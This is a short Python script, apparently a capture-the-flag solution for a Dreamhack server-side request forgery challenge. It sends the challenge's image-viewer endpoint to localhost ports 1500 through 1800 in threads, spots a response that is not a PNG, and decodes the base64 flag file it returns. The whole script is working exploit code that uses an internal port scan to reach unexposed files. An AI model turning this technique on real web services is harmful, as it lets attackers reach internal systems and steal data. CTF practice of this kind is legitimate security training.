import requests
import re
import threading
import time
from base64 import b64decode

found = False

def req(p):
    global found
    if found:
        return

    r = requests.post('http://host3.dreamhack.games:23642/img_viewer', {
        'url': f'http://localhost:{p}/flag.txt'
    })

    if not 'iVBORw0KGgoAAAANS' in r.text:
        found = True
        res = re.search('base64, (.*)"', r.text)
        print(p, b64decode(res[1]).decode())
    else:
        if p % 10 == 0:
            print(p)

for p in range(1500, 1801):
    if found:
        break
    
    t = threading.Thread(target=req, args=(p, ))
    t.start()
    time.sleep(0.1)

# This is ssrf flag